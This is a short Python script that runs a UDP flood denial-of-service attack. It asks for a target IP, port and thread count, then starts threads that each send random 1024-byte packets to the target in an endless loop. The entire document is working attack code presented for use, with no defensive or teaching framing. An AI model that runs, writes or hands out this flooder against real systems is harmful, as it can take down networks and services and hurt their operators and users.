
import socket, random, threading

def udp_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while True:
        sock.sendto(packet, (ip, port))
        print(f"[✓] UDP packet sent to {ip}:{port}")

def start_udp_flood():
    ip = input("[?] Target IP: ")
    port = int(input("[?] Port: "))
    threads = int(input("[?] Threads: "))
    for _ in range(threads):
        threading.Thread(target=udp_attack, args=(ip, port)).start()
